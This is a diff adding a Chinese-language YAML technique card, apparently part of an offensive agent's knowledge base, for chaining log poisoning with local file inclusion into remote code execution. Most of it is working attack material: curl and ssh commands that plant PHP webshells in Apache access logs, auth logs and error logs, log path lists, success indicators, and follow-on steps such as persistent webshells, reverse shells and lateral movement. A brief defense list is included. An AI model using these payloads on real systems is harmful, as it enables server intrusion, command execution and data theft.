@@ -1,0 +1,93 @@
+# 技术卡片: 日志投毒 → LFI → RCE
+# 分类: log-poisoning / lfi / rce
+# 版本: 1.0
+# 日期: 2026-07-23
+# 来源: poison-ops P2 / OWASP LFI / HackTricks
+
+id: "log-poisoning-lfi-rce"
+name: "日志投毒 → LFI → 远程代码执行"
+category: "log-poisoning"
+subcategory: "lfi-rce"
+severity: "critical"
+
+description: |
+  通过 HTTP 请求头（User-Agent/Referer/URI）或 SSH/FTP 等协议注入
+  恶意代码到服务端日志文件。利用存在的本地文件包含（LFI）漏洞
+  包含被污染的日志文件，执行注入的代码。
+
+trigger_signals:
+  - "存在 LFI 漏洞（?file=../../etc/passwd 返回成功）"
+  - "Apache/Nginx 日志路径可访问"
+  - "可控的 User-Agent/Referer 记录在日志中"
+  - "PHP/ASP/JSP 等可执行脚本环境"
+
+payloads:
+  - technique: "Apache Access Log 注入 PHP Webshell"
+    payload: |
+      curl https://target.com/ -H "User-Agent: <?php system($_GET[cmd]); ?>"
+      curl "https://target.com/page?file=/var/log/apache2/access.log&cmd=id"
+    note: "注入到 User-Agent，通过 LFI 包含日志执行命令"
+
+  - technique: "SSH Auth Log 注入"
+    payload: |
+      ssh '<?php system("id");?>@target.com'
+    note: "SSH 登录名写入 /var/log/auth.log，通过 LFI 执行"
+
+  - technique: "Error Log 注入 (404)"
+    payload: |
+      curl "https://target.com/<?php system('id'); ?>.php"
+    note: "触发 404 将文件名写入 error log"
+
+  - technique: "自包含短标签 Webshell"
+    payload: |
+      curl https://target.com/ -H "User-Agent: <?=shell_exec(\$_GET[0]);?>"
+    note: "使用 <?= 短标签，无需空格；触发: ?file=...&0=whoami"
+
+  - technique: "/proc/self/environ 注入 (PHP CGI)"
+    payload: |
+      curl https://target.com/ -H "User-Agent: <?php system('id'); ?>"
+    note: "PHP CGI 模式下可通过 /proc/self/environ 执行"
+
+  - technique: "日志路径字典"
+    payload: |
+      Apache: /var/log/apache2/access.log (Debian) /var/log/httpd/access_log (RHEL)
+      Nginx:  /var/log/nginx/access.log
+      SSH:    /var/log/auth.log (Debian) /var/log/secure (RHEL)
+
+success_indicators:
+  - "通过 LFI 包含日志文件后，响应中包含命令执行输出"
+  - "id/whoami 等系统命令在 HTTP 响应中回显"
+  - "成功写入 Webshell 到 Web 目录"
+
+prerequisites:
+  - "目标存在 LFI 漏洞（能包含系统文件）"
+  - "日志文件路径已知或可枚举"
+  - "日志文件可读（Web 进程有读权限）"
+  - "目标为脚本执行环境（PHP/ASP/JSP）"
+
+upgrade_paths:
+  - "写入 Webshell → 持久化访问"
+  - "反弹 Shell → 内网渗透"
+  - "提权 → 云元数据访问"
+
+defense:
+  - "修复 LFI 漏洞（白名单文件包含）"
+  - "日志文件中过滤特殊字符"
+  - "Web 进程对日志文件只写不读"
+  - "open_basedir 限制文件访问"
+
+tools:
+  - "curl"
+
+confidence: "high"
+limitations:
+  - "日志文件过大导致包含超时"
+  - "日志轮转清除注入内容"
+  - "WAF 检测 User-Agent 中的 PHP 代码"
+  - "磁盘安全: 单次注入不超过10KB"
+
+sources:
+  - agent: "blackmule"
+    date: "2026-07-23"
+  - ref: "OWASP: Local File Inclusion"
+  - ref: "HackTricks: File Inclusion"
